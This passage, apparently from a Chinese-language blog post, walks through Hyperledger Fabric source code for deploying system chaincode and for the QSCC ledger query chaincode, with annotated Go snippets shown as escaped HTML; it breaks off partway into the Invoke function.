&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SelfDescribingSysCC&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
	&lt;span style=&#34;color:#75715e&#34;&gt;//Unique name of the system chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;

	&lt;span style=&#34;color:#75715e&#34;&gt;// Chaincode returns the underlying chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt;() &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;SelfDescribingSysCC&lt;/code&gt;的第二个方法为&lt;code&gt;Chaincode()&lt;/code&gt;返回值为&lt;code&gt;shim.Chaincode&lt;/code&gt;类型。在&lt;code&gt;core\scc\cscc\configure.go&lt;/code&gt;中发现如下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerConfiger&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt;() &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可知&lt;code&gt;start.go&lt;/code&gt;中的&lt;code&gt;cc&lt;/code&gt;为每个链码的配置&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PeerConfiger&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;policyChecker&lt;/span&gt;          &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PolicyChecker&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;configMgr&lt;/span&gt;              &lt;span style=&#34;color:#a6e22e&#34;&gt;config&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Manager&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;aclmgmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ACLProvider&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;deployedCCInfoProvider&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DeployedChaincodeInfoProvider&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;legacyLifecycle&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;plugindispatcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;LifecycleResources&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;newLifecycle&lt;/span&gt;           &lt;span style=&#34;color:#a6e22e&#34;&gt;plugindispatcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CollectionAndLifecycleResources&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Peer&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;bccsp&lt;/span&gt;                  &lt;span style=&#34;color:#a6e22e&#34;&gt;bccsp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BCCSP&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面是&lt;code&gt;DeploySysCC&lt;/code&gt;的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeStreamHandler&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;HandleChaincodeStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccintf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeStream&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;LaunchInProc&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;packageID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt;{}
} &lt;span style=&#34;color:#75715e&#34;&gt;// 负责peer节点与链码之间的通信
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DeploySysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sysCC&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SelfDescribingSysCC&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeStreamHandler&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeStreamHandler&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Infof&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deploying system chaincode &amp;#39;%s&amp;#39;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sysCC&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;())

	&lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sysCC&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;())
	&lt;span style=&#34;color:#a6e22e&#34;&gt;done&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeStreamHandler&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;LaunchInProc&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)

	&lt;span style=&#34;color:#a6e22e&#34;&gt;peerRcvCCSend&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeMessage&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;ccRcvPeerSend&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeMessage&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;// 并行传输数据
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;() {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newInProcStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;peerRcvCCSend&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccRcvPeerSend&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CloseSend&lt;/span&gt;()

		&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;starting chaincode-support stream for  %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeStreamHandler&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HandleChaincodeStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Criticalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;shim stream ended with err: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
	}()

	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sysCC&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SelfDescribingSysCC&lt;/span&gt;) {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newInProcStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccRcvPeerSend&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peerRcvCCSend&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CloseSend&lt;/span&gt;()

		&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode started for %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;StartInProc&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sysCC&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt;())
		&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccLogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Criticalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;system chaincode ended with err: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
	}(&lt;span style=&#34;color:#a6e22e&#34;&gt;sysCC&lt;/span&gt;)
	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;done&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因此，在serve.go代码中，对lscc,qscc,cscc三个系统链码进行相应的初始创建，随后根据配置信息部署到peer节点中。&lt;/p&gt;
&lt;h3 id=&#34;查询系统链码-querier-system-chaincode-qscc&#34;&gt;查询系统链码 (&lt;em&gt;Querier System Chaincode&lt;/em&gt;, QSCC)&lt;/h3&gt;
&lt;h4 id=&#34;源代码&#34;&gt;源代码&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;/core/scc/qscc/query.go&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在所有Peer节点上运行，提供账本查询接口，包括了区块查询、交易查询等。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;qscc&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;                       &lt;span style=&#34;color:#75715e&#34;&gt;// 格式化IO
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strconv&amp;#34;&lt;/span&gt;                   &lt;span style=&#34;color:#75715e&#34;&gt;// 数据类型转换
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-chaincode-go/shim&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// shim包提供API访问链码chaincode的状态变量，chaincode用来和peer沟通的接口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-protos-go/peer&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 调用.pb.go文件，由proto文件生成
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/common/flogging&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/aclmgmt&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/ledger&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/protoutil&amp;#34;&lt;/span&gt;         &lt;span style=&#34;color:#75715e&#34;&gt;// Proto Buffer的通用方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;// LedgerGetter gets the PeerLedger associated with a channel.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerGetter&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetLedger&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerLedger&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// New returns an instance of QSCC.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Typically this is called once per peer.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aclmgmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ACLProvider&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ledgers&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerGetter&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ledgers&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;ledgers&lt;/span&gt;,
	}
}

&lt;span style=&#34;color:#75715e&#34;&gt;// (e *LedgerQuerier) 表示这是LedgerQuerier结构体的方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;              { &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qscc&amp;#34;&lt;/span&gt; }
&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt;() &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Chaincode&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; }

&lt;span style=&#34;color:#75715e&#34;&gt;// LedgerQuerier implements the ledger query functions, including:
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// - GetChainInfo returns BlockchainInfo
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// - GetBlockByNumber returns a block
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// - GetBlockByHash returns a block
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// - GetTransactionByID returns a transaction
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aclmgmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ACLProvider&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;ledgers&lt;/span&gt;     &lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerGetter&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;qscclogger&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;flogging&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;MustGetLogger&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qscc&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;// 将函数名定义为字符串常量，用于invoke的第一个arg参数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; (
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetChainInfo&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetChainInfo&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByNumber&lt;/span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetBlockByNumber&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByHash&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetBlockByHash&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTransactionByID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetTransactionByID&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByTxID&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetBlockByTxID&amp;#34;&lt;/span&gt;
)

&lt;span style=&#34;color:#75715e&#34;&gt;// Init is called once per chain when the chain is created.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// This allows the chaincode to initialize any variables on the ledger prior
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// to any transaction execution on the chain.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Init&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeStubInterface&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;qscclogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Init QSCC&amp;#34;&lt;/span&gt;)

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
}


&lt;span style=&#34;color:#75715e&#34;&gt;// 调用Invoke时，args[0]为查询函数名，args[1]为chain id，在加到stub包之前为暂时的id
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 每个函数都需要额外的参数，如下:
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// # GetChainInfo: 返回一个以字节为单位的BlockchainInfo对象
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// # GetBlockByNumber: 返回args[2]中所指定的块
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// # GetBlockByHash: 返回args[2]中的块哈希值所指定的块
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// # GetTransactionByID: 返回args[2]中的id所指定的交易事务
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LedgerQuerier&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Invoke&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeStubInterface&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; { &lt;span style=&#34;color:#75715e&#34;&gt;// 通过args调用内部函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetArgs&lt;/span&gt;() &lt;span style=&#34;color:#75715e&#34;&gt;// stub是RPC中客户端与服务器端传输的消息包，将其解包并获取args
